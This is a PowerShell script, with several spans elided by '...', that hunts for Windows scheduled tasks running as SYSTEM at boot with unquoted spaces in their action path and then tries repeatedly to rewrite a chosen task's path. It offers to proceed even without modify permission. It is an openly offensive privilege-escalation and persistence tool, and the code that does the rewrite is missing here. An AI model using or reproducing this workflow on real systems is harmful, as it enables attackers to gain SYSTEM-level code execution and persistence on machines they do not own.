# Startup-Scheduled Task Manipulator Script

# Function to display the list of startup tasks neatly
function Show-TaskList {
    param($taskList)
    Write-Host "`n[+] Available Startup Tasks with unquoted spaces:" -ForegroundColor Cyan
...
# Main Logic
Write-Host "[+] Starting Startup Task Modifier..." -ForegroundColor Cyan
Write-Host ""   # spacing

# Gather startup tasks running as SYSTEM with Boot trigger and unquoted spaces in action path
$taskList = Get-ScheduledTask | Where-Object {
    ($_.Principal.UserId -eq 'SYSTEM' -or $_.Principal.UserId -eq 'NT AUTHORITY\\SYSTEM') -and
    ($_.Triggers | Where-Object { $_.TriggerType -eq 'Boot' })
} | ForEach-Object {
...
if ($taskList.Count -eq 0) {
    Write-Host "[-] No startup tasks found with vulnerabilities!" -ForegroundColor Yellow
    return
}

# Display the startup task list
Show-TaskList $taskList

# Prompt user to select a task
while ($true) {
    Write-Host ""   # spacing
    $selection = Read-Host "Enter the startup task number you want to modify"
...
if (-not $canModify) {
    $resp = Read-Host "No modify permission for this startup task. Attempt anyway? (Y/n)"
    if ($resp -match '^[Nn]') {
        Write-Host "Aborting due to insufficient permissions." -ForegroundColor Red
        return
    }
}

# Attempt to change the startup task action path with retries
Write-Host "`nChanging path for startup task '$($chosen.TaskName)'..." -ForegroundColor Cyan
$success = $false
for ($i = 1; $i -le 50; $i++) {
    try {
...
if (-not $success) {
    ...
    $retry = Read-Host "Try a different path? (Y/n)"
    if ($retry -match '^[Yy]') {
        & $PSCommandPath
    }
} else {
    Write-Host "`n[+] Startup task modification complete!" -ForegroundColor Cyan
}
